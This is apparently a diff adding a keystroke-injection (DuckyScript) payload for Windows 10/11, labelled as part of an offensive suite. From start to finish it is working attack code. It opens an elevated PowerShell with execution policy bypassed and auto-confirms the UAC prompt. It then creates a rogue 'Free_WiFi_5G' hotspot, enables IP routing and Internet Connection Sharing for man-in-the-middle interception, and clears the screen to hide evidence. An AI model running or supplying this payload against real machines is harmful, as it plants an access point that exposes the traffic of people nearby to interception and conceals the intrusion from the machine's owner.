@@ -1,0 +1,54 @@
+REM ==========================================
+REM Title: Rogue WiFi Hotspot Creator
+REM Author: NullSec Suite
+REM Target: Windows 10/11
+REM Description: Creates a rogue WiFi hotspot
+REM   on the target machine using netsh hosted
+REM   network and enables Internet Connection
+REM   Sharing, allowing MITM positioning.
+REM Category: Collection / Man-in-the-Middle
+REM ==========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass'"
+ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+REM Configure the hosted network
+STRING netsh wlan set hostednetwork mode=allow ssid="Free_WiFi_5G" key="openaccess1"
+ENTER
+DELAY 500
+REM Start the hosted network
+STRING netsh wlan start hostednetwork
+ENTER
+DELAY 1000
+REM Enable IP routing in registry
+STRING Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters' -Name 'IPEnableRouter' -Value 1
+ENTER
+DELAY 400
+REM Configure mobile hotspot via Settings API as fallback
+STRING [Windows.Networking.NetworkOperators.NetworkOperatorTetheringManager,Windows.Networking.NetworkOperators,ContentType=WindowsRuntime] | Out-Null
+ENTER
+DELAY 400
+REM Set up NAT via ICS PowerShell
+STRING $netShare = New-Object -ComObject HNetCfg.HNetShare
+ENTER
+DELAY 350
+STRING $connections = $netShare.EnumEveryConnection
+ENTER
+DELAY 350
+REM Enable sharing on primary adapter
+STRING foreach ($c in $connections) { $props = $netShare.NetConnectionProps($c); if ($props.Status -eq 2) { $cfg = $netShare.INetSharingConfigurationForINetConnection($c); $cfg.EnableSharing(0) } }
+ENTER
+DELAY 500
+REM Display hotspot status
+STRING netsh wlan show hostednetwork
+ENTER
+DELAY 500
+REM Minimize the window to hide evidence
+STRING Start-Sleep -Seconds 2; Clear-Host; exit
+ENTER
+DELAY 300
+ALT F4
